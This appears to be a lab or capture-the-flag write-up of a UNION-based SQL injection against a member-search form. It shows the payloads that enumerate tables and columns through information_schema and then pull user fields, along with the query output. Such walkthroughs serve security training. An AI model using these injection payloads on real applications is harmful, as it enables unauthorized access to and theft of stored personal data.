

### Search members by ID

By entering an ID number, we can attempt to retrieve an initial table!

```ID: 1 
First name: one
Surname : me```

We can start by sending a SQL command:

``SELECT * FROM users``

``You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1``

We want to be able to use our own SELECT command and ignore the first one that gives an error. We can use the UNION method. The UNION keyword allows you to execute one or more additional SELECT queries and append the results to the original query.

We don't have the names of the columns, but thanks to ``information_schema``, which is default the database informations,  we can retrieve all the necessary data.

``1 UNION SELECT column_name, table_name FROM information_schema.columns``

This gives us the corresponding tables and columns:

```ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: user_id
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: first_name
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: last_name
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: town
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: country
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: planet
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: Commentaire
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: countersign
Surname: users```

Therefore, we can retrieve the data from the users table with the following command:

``1 UNION SELECT first_name, country FROM users``
